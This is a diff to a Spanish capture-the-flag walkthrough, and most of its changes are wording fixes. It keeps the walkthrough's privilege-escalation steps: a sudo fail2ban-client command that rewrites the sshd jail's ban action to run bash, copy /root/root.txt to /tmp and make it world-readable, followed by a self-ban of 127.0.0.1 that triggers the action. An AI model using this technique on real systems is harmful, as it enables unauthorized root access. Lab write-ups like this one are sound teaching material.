@@ -92,15 +92,15 @@ siguiente comando
 
 Antes de ejecutar los comandos para conseguir la flag de root se
 reiniciará el servicio de fail2ban para asegurarse de que no haya
-errores con el siguiente comando
+errores con el siguiente comando:
 
-sudo /usr/bin/fail2ban-client restart
+//sudo /usr/bin/fail2ban-client restart//
 
 sudo /usr/bin/fail2ban-client set sshd action iptables-multiport
 actionban \"/bin/bash -c \'cat /root/root.txt \> /tmp/root.txt && chmod
 777 /tmp/root.txt\'\"
 
-Se puede ver en este comando como dentro de la jail sshd se llama a la
+Se puede ver en este comando que dentro de la jail sshd se llama a la
 acción iptables-multiport para que cuando se banee una ip ejecute un
 comando que leera el contenido de root.txt dentro del directorio root
 debido a que normalmente allí es donde se encuentran las flags en los
@@ -112,9 +112,11 @@ Luego de eso se ejecuta el siguiente comando para banear una ip
 sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
 
 ![](images/Paso11.png)
+
 //Uso de los codigos anteriores
 
 
 ![](images/Paso12.png)
+
 Dentro del directorio tmp se logra ver un txt llamado root con la
 bandera necesaria para completar la máquina.
